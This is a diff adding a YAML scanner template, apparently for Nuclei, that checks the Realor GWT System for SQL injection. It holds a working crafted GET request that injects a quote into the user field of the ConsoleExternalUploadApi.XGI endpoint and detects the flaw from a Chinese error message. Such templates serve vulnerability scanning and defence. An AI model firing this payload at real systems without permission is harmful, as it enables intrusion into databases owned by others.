@@ -1,0 +1,20 @@
+id: yaml-poc-realor-gwt-system-sql-injection
+info:
+  name: Realor GWT System SQL Injection
+  author: jiapeng.han
+  severity: critical
+  description: |
+    This template checks for a SQL injection vulnerability in the Realor GWT System. The vulnerability can be exploited via specially crafted GET requests.
+  reference:
+    - https://mp.weixin.qq.com/s/zeH6p5lFQ4kzu5HpfTpXog
+http:
+  - raw:
+      - |
+        GET /ConsoleExternalUploadApi.XGI?key=FarmName&initParams=command_uploadAuthorizeKeyFile__user_admin%27-%27__pwd_password123__serverIdStr_1&sign=7627a11bf8f214451e7929f05299b9f6 HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "未查询到符合条件的用户"
+        part: body
